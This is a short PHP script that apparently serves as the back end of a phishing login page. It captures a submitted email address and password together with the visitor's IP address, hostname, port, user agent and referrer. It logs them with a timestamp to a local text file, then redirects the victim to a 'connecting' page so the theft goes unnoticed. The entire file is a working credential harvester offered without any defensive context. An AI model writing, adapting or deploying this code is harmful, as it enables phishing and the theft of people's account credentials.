<?php

$email = $_POST['email'];
$password = $_POST['password'];


$date = date("Y/m/d");
$time = date("h:i:sa");

$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);


$data = fopen('data.txt','a');
fwrite($data,"\n");
fwrite($data," "."\n");
fwrite($data, '---- START --- '."\n");
fwrite($data,$date." ");
fwrite($data,$time." GMT "."\n");

fwrite($data, 'IP Address: '."".$ip ."\n");
fwrite($data, 'Hostname: '."".$hostname ."\n");
fwrite($data, 'Port Number: '."".$port ."\n");
fwrite($data, 'User Agent: '."".$agent ."\n");
fwrite($data, 'HTTP Referer: '."".$ref ."\n");
fwrite($data,"email:  ");
fwrite($data,$email."\n");
fwrite($data,"password:  ");
fwrite($data,$password."\n");
fwrite($data, '---- END --- '."\n\n");
fwrite($data,"\n");
fwrite($data," "."\n");

sleep(2);
header("location:connecting.html");
ob_end_flush();

?>